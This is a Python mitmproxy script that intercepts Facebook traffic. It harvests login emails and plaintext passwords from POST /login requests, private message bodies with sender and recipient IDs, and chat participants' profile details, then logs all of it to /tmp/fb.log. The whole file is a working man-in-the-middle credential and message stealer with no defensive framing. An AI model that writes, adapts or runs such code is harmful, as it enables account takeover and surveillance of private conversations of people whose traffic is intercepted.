from pprint import pprint
import re
import json
import urllib2

class Message(object):
    def __init__(self):
        pass

    @staticmethod
    def parse(d):
        pass


def is_host(req, host):
    return re.search(host, req.host) != None

def is_path(req, path):
    return re.search(path, req.path) != None

def fb_json(resp):
    c = resp.get_decoded_content()
    trash1 = "for (;;);"
    if c.startswith(trash1):
        c = c[len(trash1):]
    try:
        return json.loads(c)
    except ValueError:
        return None

def fb_query(rr):
    return urllib2.urlparse.parse_qs(rr.get_decoded_content())

def print_json(rr):
    try:
        pprint(fb_json(rr))
    except ValueError:
        print "cannot read JSON"
        pass
    

def save(fact):
    print "FACT!!"
    pprint(fact)
    with open("/tmp/fb.log","a") as out:
        pprint(fact, out)

class PostData(object):
    def __init__(self, req, base_k=''):
        self.data = fb_query(req)
        self.base_k = base_k

    def key(self,*ks):
        if self.base_k:
            bk = self.base_k
        else:
            bk = ks[0]
            ks = ks[1:]
        return bk + ''.join(map(lambda x: "[{0}]".format(x), ks))

    def val(self,*ks):
        k = self.key(*ks)
        if k in self.data:
            return self.data[k][0]
        return None

def select(hsh, *path, **cond):
    c = hsh
    for p in path:
        if p in c:
            c = c[p]
        else:
            return None
    def matches(o, cond):
        for k,v in cond.items():
            if not (k in o and o[k] == v):
                return False
        return True

    if isinstance(c, list):
        return filter(lambda x: matches(x, cond), c)
    else:
        if matches(c, cond): 
            return c
        return None

def clean_fbid(fbid):
    if fbid.startswith('fbid:'):
        return int(fbid[5:])
    return fbid

def a_message_batch(flow):
    saved = 0
    if flow.request.method != "POST": return
    
    data = PostData(flow.request, 'message_batch')

    for i in xrange(0, 99):
        if data.val(i, 'message_id') is None: return

        author = data.val(i, 'author')
        in_chat = []
        for p in xrange(0,99):
            recipient = data.val(i, 'specific_to_list', p)
            if recipient is None: break
            in_chat.append(recipient)

        fact = {'kind': 'message',
                'id': data.val(i, 'message_id'),
                'content': data.val(i, 'body'),
                'frm': clean_fbid(author),
                'to': map(clean_fbid, in_chat),
                'time': int(data.val(i, 'timestamp'))/1000
        }
        save(fact)
        saved+=1
    return saved

def a_ms_pull(flow):
    saved = 0
    data = fb_json(flow.response)
    if data is None: return
    msgs = select(data, 'ms', type='m_messaging')
    if msgs is None: return
    for m in msgs:
        fact = {'kind': 'message',
                'content': m['snippet'],
                'frm':m['author_fbid'],
                'frm_name': m['author_name'],
                'to':m['participant_ids'],
                'to_name': m['thread_name'],
                'id':m['tid'],
                }
        save(fact)
        saved += 1
    return saved


def a_thread_sync(flow):
    saved = 0
    data = fb_json(flow.response)
    if data is None: return
    participants = select(data, 'payload', 'participants')
    if participants is None: return
    for p in participants:
        fact = {'kind': 'user',
                'id': clean_fbid(p['id']),
                'nick': p['vanity'],
                'picture': p['big_image_src'],
                'name': p['name'],
                'gender': p['gender']
            }
        save(fact)
        saved += 1
    return saved

def a_password(flow):
    if flow.request.method != 'POST': return
    if not flow.request.path.startswith("/login"): return
    data = PostData(flow.request)
    fact  = {
        'kind': 'cred',
        'id': data.val('email'),
        'email': data.val('email'),
        'password': data.val('pass')
    }
    pprint(data.data)
    save(fact)
    return 1

def response(context, flow):

    q = flow.request
    if not is_host(q, r"facebook\.com"): return
    if not (is_path(q, r"ajax/mercury") or is_path(q, r"^/pull") or is_path(q, r"^/login")): return

    saved = 0
    saved += a_password(flow) or 0
    saved += a_message_batch(flow) or 0
    saved += a_ms_pull(flow) or 0
    saved += a_thread_sync(flow) or 0
    

    if saved == 0:
        print "---"
        print q.method, q.host, q.path
        if q.method == "POST" and q.content:
            print "DATA:"
            pprint(fb_query(q))
            print "RETURN:"
        print_json(flow.response)
    # r = flow.response
    # print "---- content len {0}".format(len(r.content))
    # for h,v in r.headers.items():
    #     print "{0}: {1}".format(h, v)

